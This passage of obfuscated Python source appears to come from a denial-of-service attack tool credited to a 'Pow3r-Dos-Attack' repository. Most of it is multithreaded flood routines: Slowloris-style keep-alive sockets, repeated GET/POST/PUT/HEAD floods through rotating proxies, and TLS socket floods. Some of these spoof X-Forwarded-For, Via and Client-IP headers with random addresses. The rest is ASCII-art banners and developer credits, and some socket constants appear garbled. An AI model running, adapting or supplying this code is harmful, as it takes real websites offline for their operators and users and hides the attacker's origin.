		except :IIIIlllIIIlIIIIlI .close ();pass 
def IIlIIlIllIlIIIIlI (IIIlIIIllIlIlllll ,IlIIIlIllIIIIlllI ,IIIlIIIIIIllIlIlI ):
	for IIlIllIIIIIIIIIll in range (int (IIIlIIIIIIllIlIlI )):threading .Thread (target =IIIIlllIIlIllIllI ,args =(IIIlIIIllIlIlllll ,IlIIIlIllIIIIlllI )).start ()
def IIIIlllIIlIllIllI (IIllIIIlIllIllIII ,IIIIIllIlIIlllIII ):
	IIlIIlIlllIIllIII ='utf-8';IIllllIlIIIlIlIlI ();IIlIIIIlllllllIlI =open (_IIllIIIIlIIlIIlll ,_IIllIIIllIlIIlIll ).read ().split (_IIllIIIlIIlIIlIII );IlIlIllllllllllII =random .choice (IIlIIIIlllllllIlI ).strip ().split (_IIIIlIlIlIlllIIll );IIllIllIlIllIIlll =time .time ()+int (IIIIIllIlIIlllIII );IIIlIIlIIlIlIIIIl =random .choice (IllIlIlIIlllllllI );IlIIIIIlIIIIlIlll =random .choice (IIlIIllllllIIIlIl );IlIlIlllIlIIlIlII =IIIlIIlIIlIlIIIIl +IIllIIIlIllIllIII +_IIIIlIIlllllIllII +urlparse (IIllIIIlIllIllIII ).netloc +_IIllIlIllIIIllIll ;IlIlIlllIlIIlIlII +=_IllIlIIlIIIlIIlIl ;IlIlIlllIlIIlIlII +=IlIIIIIlIIIIlIlll +_IIllIlIllIIIllIll ;IlIlIlllIlIIlIlII +=_IllllIlIlIlIIlIIl ;IlIlIlllIlIIlIlII +=_IIlIIIllIIlIIllIl ;IlIlIlllIlIIlIlII +=_IlIIIlIIIIIIIIIIl ;IlIlIlllIlIIlIlII +=_IIIllllllIllllIII ;IlIlIlllIlIIlIlII +=_IllIlIllIlllllllI ;IlIlIlllIlIIlIlII +=_IllllIIlIlIIlIlll ;IlIlIlllIlIIlIlII +=_IIIlllIlllIlIllll 
	while time .time ()<IIllIllIlIllIIlll :
		try :
			IIIlllIIIIIlllllI =socks .socksocket ();IIIlllIIIIIlllllI .connect ((str (urlparse (IIllIIIlIllIllIII ).netloc ),int (443 )));IIIlllIIIIIlllllI .set_proxy (socks .SOCKS5 ,str (IlIlIllllllllllII [0 ]),int (IlIlIllllllllllII [1 ]));IIllIIIIIllllIIll =ssl .SSLContext ();IIIlllIIIIIlllllI =IIllIIIIIllllIIll .wrap_socket (IIIlllIIIIIlllllI ,server_hostname =urlparse (IIllIIIlIllIllIII ).netloc );IIIlllIIIIIlllllI .send ('GET /?{} HTTP/1.1\r\n'.format (random .randint (0 ,2000 )).encode (IIlIIlIlllIIllIII ));IIIlllIIIIIlllllI .send ('User-Agent: {}\r\n'.format (random .choice (IIlIIllllllIIIlIl )).encode (IIlIIlIlllIIllIII ));IIIlllIIIIIlllllI .send ('{}\r\n'.format ('Accept-language: en-US,en,q=0.5').encode (IIlIIlIlllIIllIII ));IIIlllIIIIIlllllI .send ('Connection:keep-alive'.encode (IIlIIlIlllIIllIII ))
			while _IlIIlIllIIIllIIlI :time .sleep (14 );IIIlllIIIIIlllllI .send ('X-a: {}\r\n'.format (random .randint (1 ,5000 )).encode (IIlIIlIlllIIllIII ))
		except :IIIlllIIIIIlllllI .close ();IIIIlllIIlIllIllI ()
def IlIlllIlIIIlllIll (IIlIlIIIlIIIllIII ,IIlIIIIllIllIlIlI ,IlllllIlIlIIlIllI ):
	for IIIIllllIlllllIlI in range (int (IlllllIlIlIIlIllI )):threading .Thread (target =IIIIIIIllIIllIllI ,args =(IIlIlIIIlIIIllIII ,IIlIIIIllIllIlIlI )).start ()
def IIIIIIIllIIllIllI (IIlllIlIIIIlllllI ,IlllIlIIllIllIlll ):
	IIIlllIIlIIIIIIII ='login';IlIIIIIlIIlIIlIII =time .time ()+int (IlllIlIIllIllIlll )
	while time .time ()<IlIIIIIlIIlIIlIII :
		IIlllIllIIIIlIlll ={_IlIIlIlIIIIllIlll :_IllIIIIIlIlllIlll ,_IllIIIIllIllIllIl :_IIllIlllIlIlIIlII ,_IlIIIlIllIIIIlllI :_IIllIIIIllIIIIllI ,_IllIIIIIlIIlllIIl :_IllllIlllllllllIl ,_IlllllIlIIlIIlIII :_IIIIIlIlllIIlIIII ,'Pragma':_IIIIIlIlllIIlIIII ,_IllIlIlIIIIIIllll :_IlIllllIIllIlIllI ,_IlIllIlIIlIIlIIIl :'1',_IlllllIIlIlllllIl :'document',_IIlllIlIllIIIIlIl :'navigate',_IllIIlllIlllllIlI :_IIlIIIlIllIIlIIIl ,_IlIIlllIIllllIllI :'?1'};IIIIIIlIllIllIIlI ='http.txt';IlllIlllllIlIlIll =list (map (lambda IlIllIllIlllIIlll :IlIllIllIlllIIlll .strip (),open (IIIIIIlIllIllIIlI )));IlllIlllIlllIIllI =random .randint (65565 ,314159 );IlIIIlIIIllIIlllI =random .choice (IlllIlllllIlIlIll );IIlllIlIIlIllIlll ={_IIllIIIlIlIIIlIlI :_IIllIIIlIlIIIlIlI +IlllIlllllIlIlIll }
		with httpx .Client (http2 =_IlIIlIllIIIllIIlI ,proxies =random .choice (IIlllIlIIlIllIlll ),headers =IIlllIllIIIIlIlll ,trust_env =_IIlIlIIllllllIlIl )as IIlIllllIIIIIlIll :
			try :
				while _IlIIlIllIIIllIIlI :
					for _IIIlllIIIllllIIlI in range (400 ):IllllIIIlIIIlIIlI =IIlIllllIIIIIlIll .get (IIlllIlIIIIlllllI );IllIIIllIIIIlllIl =IIlIllllIIIIIlIll .post (IIlllIlIIIIlllllI ,data ={IIIlllIIlIIIIIIII :IlllIlllIlllIIllI });IlIlIIIllIlIlllIl =IIlIllllIIIIIlIll .put (IIlllIlIIIIlllllI ,data ={IIIlllIIlIIIIIIII :IlllIlllIlllIIllI });IIIlIIlIlllIIIlII =IIlIllllIIIIIlIll .head (IIlllIlIIIIlllllI )
			except httpx .HTTPError as IIlllIlIlIllIlllI :pass 
def IlIIIIlIIIIIllllI ():IlIllIIlIIllIllll =[192 ,168 ,0 ,1 ];IIIlIlllIIIlllIII ='.';IlIllIIlIIllIllll [0 ]=str (random .randrange (11 ,197 ));IlIllIIlIIllIllll [1 ]=str (random .randrange (0 ,255 ));IlIllIIlIIllIllll [2 ]=str (random .randrange (0 ,255 ));IlIllIIlIIllIllll [3 ]=str (random .randrange (2 ,254 ));IlIIlIIIIIlllIIlI =IlIllIIlIIllIllll [0 ]+IIIlIlllIIIlllIII +IlIllIIlIIllIllll [1 ]+IIIlIlllIIIlllIII +IlIllIIlIIllIllll [2 ]+IIIlIlllIIIlllIII +IlIllIIlIIllIllll [3 ];return IlIIlIIIIIlllIIlI 
def IllIlllIIIIlIllIl (IIllllllIIIIIIIIl ,IIllllIIllIIlIIll ,IIlIIlIlIllIlIllI ):
	for IlIllIllIIlIIIIll in range (int (IIlIIlIlIllIlIllI )):threading .Thread (target =IIIlllIIIlIlIllIl ,args =(IIllllllIIIIIIIIl ,IIllllIIllIIlIIll )).start ()
def IIIlllIIIlIlIllIl (IllIIllIlIlIIIIlI ,IIIlIllIlllllIlIl ):
	IIllllIlIIIlIlIlI ();IIIllllIIIIIlllIl =open (_IIllIIIIlIIlIIlll ,_IIllIIIllIlIIlIll ).read ().split (_IIllIIIlIIlIIlIII );IllIIIlIIlIllIlII =random .choice (IIIllllIIIIIlllIl ).strip ().split (_IIIIlIlIlIlllIIll );IIIIIlllIIIlIIlll =time .time ()+int (IIIlIllIlllllIlIl );IlIlIIIlIllllllII =random .choice (IllIlIlIIlllllllI );IlIIIIIllIlIllIlI =random .choice (IIlIIllllllIIIlIl );IIIIlIIllIIlIIllI =IlIlIIIlIllllllII +IllIIllIlIlIIIIlI +_IIIIlIIlllllIllII +urlparse (IllIIllIlIlIIIIlI ).netloc +_IIllIlIllIIIllIll ;IIIIlIIllIIlIIllI +=IlIIIIIllIlIllIlI +_IIllIlIllIIIllIll ;IIIIlIIllIIlIIllI +=_IllllIlIlIlIIlIIl ;IIIIlIIllIIlIIllI +='X-Forwarded-Proto: Http\r\n';IIIIlIIllIIlIIllI +='X-Forwarded-Host: '+urlparse (IllIIllIlIlIIIIlI ).netloc +', 1.1.1.1\r\n';IIIIlIIllIIlIIllI +='Via: '+IlIIIIlIIIIIllllI ()+_IIllIlIllIIIllIll ;IIIIlIIllIIlIIllI +='Client-IP: '+IlIIIIlIIIIIllllI ()+_IIllIlIllIIIllIll ;IIIIlIIllIIlIIllI +='X-Forwarded-For: '+IlIIIIlIIIIIllllI ()+_IIllIlIllIIIllIll ;IIIIlIIllIIlIIllI +='Real-IP: '+IlIIIIlIIIIIllllI ()+_IIllIlIllIIIllIll ;IIIIlIIllIIlIIllI +=_IIIlllIlllIlIllll 
	while time .time ()<IIIIIlllIIIlIIlll :
		try :
			IllIllIIlIlllIIll =socks .socksocket ();IllIllIIlIlllIIll .connect ((str (urlparse (IllIIllIlIlIIIIlI ).netloc ),int (443 )));IllIllIIlIlllIIll .set_proxy (socks .SOCKS5 ,str (IllIIIlIIlIllIlII [0 ]),int (IllIIIlIIlIllIlII [1 ]));IllIIIlIIIlIIllIl =ssl .SSLContext ();IllIllIIlIlllIIll =IllIIIlIIIlIIllIl .wrap_socket (IllIllIIlIlllIIll ,server_hostname =urlparse (IllIIllIlIlIIIIlI ).netloc );IllIllIIlIlllIIll .send (str .encode (IIIIlIIllIIlIIllI ))
			try :
				for IIIIIllllIIIllIII in range (200 ):IllIllIIlIlllIIll .send (str .encode (IIIIlIIllIIlIIllI ));IllIllIIlIlllIIll .send (str .encode (IIIIlIIllIIlIIllI ))
			except :IllIllIIlIlllIIll .close ()
		except :IllIllIIlIlllIIll .close ()
def IlIIIIllIIIIlIlIl (IIIlIIlIlIlIllIII ,IlIIIIIIllIllIllI ,IllllIllIIIlIIlIl ):
	for IlllIIIIllIIIlllI in range (int (IllllIllIIIlIIlIl )):threading .Thread (target =IlllIIlIIllllIIII ,args =(IIIlIIlIlIlIllIII ,IlIIIIIIllIllIllI )).start ()
def IlllIIlIIllllIIII (IIIllllllIIllllII ,IlIIlllIlIllIlllI ):
	IIllllIlIIIlIlIlI ();IlIlIIIIIIIIIlIll =open (_IIllIIIIlIIlIIlll ,_IIllIIIllIlIIlIll ).read ().split (_IIllIIIlIIlIIlIII );IllIIllIIIllIIlll =random .choice (IlIlIIIIIIIIIlIll ).strip ().split (_IIIIlIlIlIlllIIll );IlIlIllIIIlIIIlll =time .time ()+int (IlIIlllIlIllIlllI );IllIIllIIlllIIIlI =random .choice (IllIlIlIIlllllllI );IllIlIIllIIIIlIII =random .choice (IIlIIllllllIIIlIl );IllIIIIlllIlllIIl =IllIIllIIlllIIIlI +IIIllllllIIllllII +_IlIlllIlIlIllIIlI +urlparse (IIIllllllIIllllII ).netloc +_IIllIlIllIIIllIll ;IllIIIIlllIlllIIl +=_IllIlIIlIIIlIIlIl ;IllIIIIlllIlllIIl +=IllIlIIllIIIIlIII +_IIllIlIllIIIllIll ;IllIIIIlllIlllIIl +=_IllllIlIlIlIIlIIl ;IllIIIIlllIlllIIl +=_IIlIIIllIIlIIllIl ;IllIIIIlllIlllIIl +=_IlIIIlIIIIIIIIIIl ;IllIIIIlllIlllIIl +=_IIIllllllIllllIII ;IllIIIIlllIlllIIl +=_IllIlIllIlllllllI ;IllIIIIlllIlllIIl +=_IllllIIlIlIIlIlll ;IllIIIIlllIlllIIl +=_IIIlllIlllIlIllll 
	while time .time ()<IlIlIllIIIlIIIlll :
		try :
			IIllIIllIllIIllll =socks .socksocket ();IIllIIllIllIIllll .connect ((str (urlparse (IIIllllllIIllllII ).netloc ),int (443 )));IIllIIllIllIIllll .set_proxy (socks .SOCKS5 ,str (IllIIllIIIllIIlll [0 ]),int (IllIIllIIIllIIlll [1 ]));IIllIllIlIIIIIIII =ssl .SSLContext ();IIllIIllIllIIllll =IIllIllIlIIIIIIII .wrap_socket (IIllIIllIllIIllll ,server_hostname =urlparse (IIIllllllIIllllII ).netloc );IIllIIllIllIIllll .send (str .encode (IllIIIIlllIlllIIl ))
			try :
				for IlIllIIIlIlIlllII in range (200 ):IIllIIllIllIIllll .send (str .encode (IllIIIIlllIlllIIl ));IIllIIllIllIIllll .send (str .encode (IllIIIIlllIlllIIl ))
			except :IIllIIllIllIIllll .close ()
		except :IIllIIllIllIIllll .close ()
def IIIlllIllIIlIIIlI (IlIllIIIIIlIllIIl ,IIIIIIlIIlIllIIlI ,IllllIIlIIIlIlllI ):
	for IIIlIllllllIIIlll in range (int (IllllIIlIIIlIlllI )):threading .Thread (target =IIIllIlIlIllIIllI ,args =(IlIllIIIIIlIllIIl ,IIIIIIlIIlIllIIlI )).start ()
def IIIllIlIlIllIIllI (IIIIIlIIllIlIIIlI ,IlIllllIIlIIlIlIl ):
	IIllllIlIIIlIlIlI ();IIIlIlIIIllIllIII =open (_IIllIIIIlIIlIIlll ,_IIllIIIllIlIIlIll ).read ().split (_IIllIIIlIIlIIlIII );IIIllIlllIllllIIl =random .choice (IIIlIlIIIllIllIII ).strip ().split (_IIIIlIlIlIlllIIll );IlllIIlllllllIlll =time .time ()+int (IlIllllIIlIIlIlIl );IlllIllIIIIIlIIlI =random .choice (IllIlIlIIlllllllI );IIlllllllllIIIlIl =random .choice (IIlIIllllllIIIlIl );IIIlllllllIIllIll =IlllIllIIIIIlIIlI +IIIIIlIIllIlIIIlI +'?='+str (random .randint (1 ,1000 ))+'='+str (random .randint (1 ,1000 ))+_IIIIlIIlllllIllII +urlparse (IIIIIlIIllIlIIIlI ).netloc +_IIllIlIllIIIllIll ;IIIlllllllIIllIll +=_IllIlIIlIIIlIIlIl ;IIIlllllllIIllIll +=IIlllllllllIIIlIl +_IIllIlIllIIIllIll ;IIIlllllllIIllIll +=_IllllIlIlIlIIlIIl ;IIIlllllllIIllIll +=_IIlIIIllIIlIIllIl ;IIIlllllllIIllIll +=_IlIIIlIIIIIIIIIIl ;IIIlllllllIIllIll +=_IIIllllllIllllIII ;IIIlllllllIIllIll +=_IllIlIllIlllllllI ;IIIlllllllIIllIll +=_IllllIIlIlIIlIlll ;IIIlllllllIIllIll +=_IIIlllIlllIlIllll 
	while time .time ()<IlllIIlllllllIlll :
		try :
			IllIllIIIIIlllIII =socks .socksocket ();IllIllIIIIIlllIII .connect ((str (urlparse (IIIIIlIIllIlIIIlI ).netloc ),int (443 )));IllIllIIIIIlllIII .set_proxy (socks .SOCKS5 ,str (IIIllIlllIllllIIl [0 ]),int (IIIllIlllIllllIIl [1 ]));IlIllIIllllllllII =ssl .SSLContext ();IllIllIIIIIlllIII =IlIllIIllllllllII .wrap_socket (IllIllIIIIIlllIII ,server_hostname =urlparse (IIIIIlIIllIlIIIlI ).netloc );IllIllIIIIIlllIII .send (str .encode (IIIlllllllIIllIll ))
			try :
				for IllIIllIllIlIlIll in range (200 ):IllIllIIIIIlllIII .send (str .encode (IIIlllllllIIllIll ));IllIllIIIIIlllIII .send (str .encode (IIIlllllllIIllIll ))
			except :IllIllIIIIIlllIII .close ()
		except :IllIllIIIIIlllIII .close ()
def IIIlIlllllllIIllI (IIlllIIIIIlllIlll ,IIIIIIllIIlIlIlll ,IlllIIlIlllIlIllI ):
	for IIIIllIlIIlIIIIIl in range (int (IlllIIlIlllIlIllI )):threading .Thread (target =IIIlllIIIIIllllIl ,args =(IIlllIIIIIlllIlll ,IIIIIIllIIlIlIlll )).start ()
def IIIlllIIIIIllllIl (IlIIIllllIllIlIII ,IIlIIIlIIIIIIIllI ):
	IIllIlllIllIllIII =open (_IlllIllIIIllIIlIl ,_IIllIIIllIlIIlIll ).read ().split (_IIllIIIlIIlIIlIII );IlIllIIIlIIllIlll =random .choice (IIllIlllIllIllIII ).strip ().split (_IIIIlIlIlIlllIIll );IIllIlIIIllIlIIII =time .time ()+int (IIlIIIlIIIIIIIllI );IIlIIlIlIlIIIlllI =random .choice (IllIlIlIIlllllllI );IIlIlIllIlllIllII =random .choice (IIlIIllllllIIIlIl );IIlIlIIlIlllIllII =IIlIIlIlIlIIIlllI +IlIIIllllIllIlIII +_IIIIlIIlllllIllII +urlparse (IlIIIllllIllIlIII ).netloc +_IIllIlIllIIIllIll ;IIlIlIIlIlllIllII +=_IllIlIIlIIIlIIlIl ;IIlIlIIlIlllIllII +=IIlIlIllIlllIllII +_IIllIlIllIIIllIll ;IIlIlIIlIlllIllII +=_IllllIlIlIlIIlIIl ;IIlIlIIlIlllIllII +=_IIlIIIllIIlIIllIl ;IIlIlIIlIlllIllII +=_IlIIIlIIIIIIIIIIl ;IIlIlIIlIlllIllII +=_IIIllllllIllllIII ;IIlIlIIlIlllIllII +=_IllIlIllIlllllllI ;IIlIlIIlIlllIllII +=_IllllIIlIlIIlIlll ;IIlIlIIlIlllIllII +=_IIIlllIlllIlIllll 
	while time .time ()<IIllIlIIIllIlIIII :
		try :
			IIllIlIllIlllIlIl =socks .socksocket ();IIllIlIllIlllIlIl .set_proxy (socks .HTTP ,str (IlIllIIIlIIllIlll [0 ]),int (IlIllIIIlIIllIlll [1 ]));IIllIlIllIlllIlIl .setsockopt (socket .SIL_SICKET ,socket .SI_REUSEADDR ,1 );IIllIlIllIlllIlIl .connect ((str (urlparse (IlIIIllllIllIlIII ).netloc ),int (443 )));IIIlllllllllIlIIl =ssl .SSLContext ();IIllIlIllIlllIlIl =IIIlllllllllIlIIl .wrap_socket (IIllIlIllIlllIlIl ,server_hostname =urlparse (IlIIIllllIllIlIII ).netloc );IIllIlIllIlllIlIl .send (str .encode (IIlIlIIlIlllIllII ))
			try :
				for _IlIIIIlIIIlIIIlII in range (200 ):IIllIlIllIlllIlIl .send (str .encode (IIlIlIIlIlllIllII ));IIllIlIllIlllIlIl .send (str .encode (IIlIlIIlIlllIllII ))
			except :IIllIlIllIlllIlIl .close ()
		except :IIllIlIllIlllIlIl .close ()
def IIIlIlIIlIIIIIlIl (IlllIlIlIlIIllIlI ,IllIIIllIllIlllll ,IIlIlIIlllllIIllI ):
	for IlIIIIIIIlllllIIl in range (int (IIlIlIIlllllIIllI )):threading .Thread (target =IlIIllIIIlIllIIlI ,args =(IlllIlIlIlIIllIlI ,IllIIIllIllIlllll )).start ()
def IlIIllIIIlIllIIlI (IlIIlllIlIIlIIlII ,IIllIlIIIlIIIllIl ):
	IlIllIIIIlIIIllII =time .time ()+int (IIllIlIIIlIIIllIl );IlllIllIlllllllll =random .choice (IllIlIlIIlllllllI );IlllIlllllIlIIlll =random .choice (IIlIIllllllIIIlIl );IlIllIllIIIIlIlll =IlllIllIlllllllll +IlIIlllIlIIlIIlII +_IIIIlIIlllllIllII +urlparse (IlIIlllIlIIlIIlII ).netloc +_IIllIlIllIIIllIll ;IlIllIllIIIIlIlll +=_IllIlIIlIIIlIIlIl ;IlIllIllIIIIlIlll +=IlllIlllllIlIIlll +_IIllIlIllIIIllIll ;IlIllIllIIIIlIlll +=_IllllIlIlIlIIlIIl ;IlIllIllIIIIlIlll +=_IIlIIIllIIlIIllIl ;IlIllIllIIIIlIlll +=_IlIIIlIIIIIIIIIIl ;IlIllIllIIIIlIlll +=_IIIllllllIllllIII ;IlIllIllIIIIlIlll +=_IllIlIllIlllllllI ;IlIllIllIIIIlIlll +=_IllllIIlIlIIlIlll ;IlIllIllIIIIlIlll +=_IIIlllIlllIlIllll 
	while time .time ()<IlIllIIIIlIIIllII :
		try :
			IIIIIIlIllIIlIIIl =socket .socket (socket .AF_INET ,socket .SICK_STREAM );IIIIIIlIllIIlIIIl .connect ((str (urlparse (IlIIlllIlIIlIIlII ).netloc ),int (443 )));IIIllllIlIllIllII =ssl .SSLContext ();IIIIIIlIllIIlIIIl =IIIllllIlIllIllII .wrap_socket (IIIIIIlIllIIlIIIl ,server_hostname =urlparse (IlIIlllIlIIlIIlII ).netloc );IIIIIIlIllIIlIIIl .send (str .encode (IlIllIllIIIIlIlll ))
			try :
				for IllllIlIIIllIllII in range (200 ):IIIIIIlIllIIlIIIl .send (str .encode (IlIllIllIIIIlIlll ));IIIIIIlIllIIlIIIl .send (str .encode (IlIllIllIIIIlIlll ))
			except :IIIIIIlIllIIlIIIl .close ()
		except :IIIIIIlIllIIlIIIl .close ()
def IlIIlllIIlIIIllII ():
	if name =='nt':system ('cls')
	else :system ('clear')
def help ():stdout .write (_IlIllIIIIIIIIlIIl );stdout .write (_IlIllIIIIIIIIlIIl );stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTWHITE_EX +'██╗  ██╗███████╗██╗     ██████╗             \n');stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTGREEN_EX +'██║  ██║██╔════╝██║     ██╔══██╗             \n');stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTGREEN_EX +'███████║█████╗  ██║     ██████╔╝              \n');stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTGREEN_EX +'██╔══██║██╔══╝  ██║     ██╔═══╝               \n');stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTGREEN_EX +'██║  ██║███████╗███████╗██║                 \n');stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTWHITE_EX +'╚═╝  ╚═╝╚══════╝╚══════╝╚═╝                   \n');stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIllIlllIIIIII );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IIIllIIIlIlIlIIll );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IlIlIlIIllIIlIIII +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +_IllIlIlIlIllIIIlI +Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IlIIIIIIIIlllIlll +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +_IllIlIlIlllIIIIll +Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IllIlIIIIlIlIllll +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +_IlIllIIllIIIlllll +Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IIlIIIIIIllllIIII +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +_IIllIlllIllIllIll +Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IIllIIlIlIlIlIlIl +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +_IlIlIlIlIllIlIIlI +Fore .LIGHTGREEN_EX +'   ║\n');stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IIIlIIIIllIlIlIII );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IllIllIlIIIlIIIll +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +' Thanks for using Tools.               '+Fore .LIGHTGREEN_EX +' ║\n');stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IlIlIIlIlIllIIIll +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +_IIlIlIlIllIIlIIll +Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IlIIllIIIlllIllll +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +' github.com/TEAM-DMC-444/               '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IlIlIIllIIIlIllII );stdout .write (_IIllIIIlIIlIIlIII )
def IllllIIIIIIlllIlI ():stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIllIlllIIIIII );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IIIllIIIlIlIlIIll );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IlIlIlIIllIIlIIII +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +_IllIlIlIlIllIIIlI +Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IlIIIIIIIIlllIlll +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +_IllIlIlIlllIIIIll +Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IllIlIIIIlIlIllll +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +_IlIllIIllIIIlllll +Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IIlIIIIIIllllIIII +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +_IIllIlllIllIllIll +Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IIllIIlIlIlIlIlIl +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +_IlIlIlIlIllIlIIlI +Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IIIlIIIIllIlIlIII );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IllIllIlIIIlIIIll +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +' Thanks for using TOOLS.                '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IlIlIIlIlIllIIIll +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +_IIlIlIlIllIIlIIll +Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IllIIIlllllllllll +Fore .LIGHTWHITE_EX +_IlIIllIIIlllIllll +Fore .LIGHTGREEN_EX +_IlIIIIlllIlllllll +Fore .LIGHTWHITE_EX +' github.com/TEAM-DMC-444/Pow3r-Dos-Attack               '+Fore .LIGHTGREEN_EX +_IIIlIlIllIIlllllI );stdout .write (_IlIlIlllllIIIIIIl +Fore .LIGHTGREEN_EX +_IlIlIIllIIIlIllII );stdout .write (_IIllIIIlIIlIIlIII )
def IlllllllIIlllIlIl ():IIllIIlIIIIllllll ='\x1b[38;2;255;20;147m• ';stdout .write ('\x1b[38;2;0;236;250m════════════════════════╗\n');stdout .write (IIllIIlIIIIllllll +Fore .LIGHTWHITE_EX +'Developer '+Fore .RED +': \x1b[38;2;0;255;189m𝘿𝙀𝙑𝙄𝙇 𝙈𝘼𝙔 𝘾𝙍𝙔\n');stdout .write (IIllIIlIIIIllllll +Fore .LIGHTWHITE_EX +'UI Design '+Fore .RED +': \x1b[38;2;0;255;189m𝟰𝟰𝟰不\n');stdout .write (IIllIIlIIIIllllll +Fore .LIGHTWHITE_EX +'Methods/Tools '+Fore .RED +': \x1b[38;2;0;255;189m𝘿𝙈𝘾_𝙏𝙀𝘼𝙈   \n');stdout .write ('\x1b[38;2;0;236;250m════════════════════════╝\n');stdout .write (_IIllIIIlIIlIIlIII )
def IIllllIlIlIllIIII ():IlIIIIlIIlIlIlIIl ='spoof ';IllllIllllIIIllIl ='   |';IIIIIlllIllIlllIl ='║ \x1b[38;2;255;20;147m•   ';IlIIlllIIlIIIllII ();stdout .write (_IlIllIIIIIIIIlIIl );stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTWHITE_EX +'██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗             \n');stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTGREEN_EX +'██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║             \n');stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTGREEN_EX +'██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ██╔╝              \n');stdout .write (_IllllIlIlIIlIIIII +Fore .LIGHTGREEN_EX +'██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝               \n');stdout .write 